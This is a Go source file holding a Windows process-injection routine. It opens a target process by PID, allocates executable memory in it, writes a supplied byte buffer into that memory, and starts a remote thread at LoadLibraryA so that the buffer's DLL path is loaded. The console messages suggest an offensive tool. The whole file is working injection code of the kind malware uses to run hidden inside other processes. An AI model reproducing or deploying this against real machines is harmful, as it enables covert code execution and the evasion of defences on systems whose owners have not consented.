package main

import (
	"fmt"
	"syscall"
	"unsafe"
)

func OpenProcessHandle(bytes []byte, pid uint32) {
	fmt.Printf("[*] Injecting %d bytes\r\n", len(bytes))

	// OpenProcess
	remoteProcHandle, err := OpenProcessCall(
		CREATE_THREAD|QUERY_INFORMATION|VM_OPERATION|VM_WRITE|VM_READ,
		0,
		uintptr(pid),
	)

	if remoteProcHandle == 0 {
		panic(fmt.Sprintf("[-] OpenProcess failed: %s", err))
	}

	// VirtualAllocEx
	addr, err := VirtualAllocExCall(
		remoteProcHandle,
		0,
		uintptr(len(bytes)),
		MEM_COMMIT|MEM_RESERVE,
		//PAGE_READWRITE,
		PAGE_EXECUTE_READWRITE,
	)
	if err != nil && addr == 0 {
		panic(fmt.Sprintf("[-] VirtualAllocEx failed: %s\r\n%d", err, addr))
	}

	// WriteProcessMemory
	bytesWritten, err := WriteProcessMemoryCall(
		remoteProcHandle,
		addr,
		(uintptr)(unsafe.Pointer(&bytes[0])),
		uintptr(len(bytes)),
	)
	if bytesWritten == 0 {
		panic(fmt.Sprintf("[-] WriteProcessMemory failed: %s", err))
	}

	//VirtualProtectEx
	// oldProt, err := VirtualProtectExCall(
	// 	remoteProcHandle,
	// 	addr,
	// 	uintptr(len(bytes)),
	// 	PAGE_EXECUTE_READWRITE,
	// )
	// if err != nil {
	// 	panic(fmt.Sprintf("[-] VirtualProtectEx failed: %s\r\n%d", err, oldProt))
	// }

	// GetProcAddress
	loadLibraryAPointer, err := syscall.BytePtrFromString("LoadLibraryA")
	if err != nil {
		panic(fmt.Sprintf("[-] LoadLibraryA conversion failed: %s", err))
	}

	loadLibraryAAddress, err := GetProcAddressCall(kernel32.Handle(), (uintptr)(unsafe.Pointer(loadLibraryAPointer)))
	_, _, err = GetProcAddress.Call(
		kernel32.Handle(),
		(uintptr)(unsafe.Pointer(loadLibraryAPointer)),
	)
	if loadLibraryAAddress == 0 {
		panic(fmt.Sprintf("[-] GetProcAddress failed: %s", err))
	}

	// CreateRemoteThread
	remoteThread, err := CreateRemoteThreadCall(
		remoteProcHandle,
		0,
		0,
		loadLibraryAAddress,
		addr,
		0,
	)
	if remoteThread == 0 {
		panic(fmt.Sprintf("[-] CreateRemoteThread failed: %s", err))
	}

	// WaitForSingleObject
	code, err := WaitForSingleObjectCall(
		remoteThread,
		INFINITE,
	)
	if code == 0xFFFFFFFF {
		panic(fmt.Sprintf("[-] WaitForSingleObject failed: %s", err))
	}

	// GetExitCodeThread
	exitCode, err := GetExitCodeThreadCall(remoteThread)
	if exitCode == 0 {
		panic(fmt.Sprintf("[-] GetExitCodeThread failed: %s", err))
	}

	// CloseHandle
	exitCode, err = CloseHandleCall(remoteThread)
	if exitCode == 0 {
		panic(fmt.Sprintf("[-] remoteProcHandle failed: %s", err))
	}

	// VirtualFreeEx
	exitCode, err = VirtualFreeExCall(
		remoteProcHandle,
		addr,
		0,
		MEM_RELEASE,
	)
	if exitCode == 0 {
		panic(fmt.Sprintf("[-] VirtualFreeEx failed: %s", err))
	}
}
